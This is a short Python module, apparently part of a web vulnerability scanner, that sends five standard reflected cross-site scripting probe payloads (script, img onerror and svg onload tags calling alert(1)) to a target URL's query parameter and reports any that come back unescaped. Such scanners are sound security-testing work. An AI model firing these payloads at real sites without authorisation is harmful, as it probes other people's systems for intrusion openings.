"""
Reflected XSS Tester Module
Tests for reflected cross-site scripting vulnerabilities
"""
from typing import Dict, List
import requests

class ReflectedXssTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>"
        ]
    
    def test_all(self) -> List[Dict]:
        """Run all reflected XSS tests"""
        for payload in self.payloads:
            result = self._test_payload(payload)
            if result:
                self.vulnerabilities.append(result)
        return self.vulnerabilities
    
    def _test_payload(self, payload: str) -> Dict:
        """Test single XSS payload"""
        try:
            response = requests.get(f"{self.target_url}?q={payload}", timeout=5)
            if payload in response.text:
                return {
                    'type': 'Reflected XSS',
                    'severity': 'HIGH',
                    'payload': payload,
                    'evidence': 'Payload reflected unescaped in response'
                }
        except:
            pass
        return None
